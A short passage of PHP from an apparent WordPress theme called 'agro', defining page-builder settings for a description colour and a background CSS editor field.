                'heading' => esc_html__('Description color', 'agro'),
                'group' => esc_html__('Color', 'agro'),
                'edit_field_class' => 'vc_col-sm-6'
            ),
            //Background CSS
            array(
                'type' => 'css_editor',
                'param_name' => 'css',
                'heading' => esc_html__('Background CSS', 'agro'),
                'group' => esc_html__('Background', 'agro')
            )
        )));
    }
}
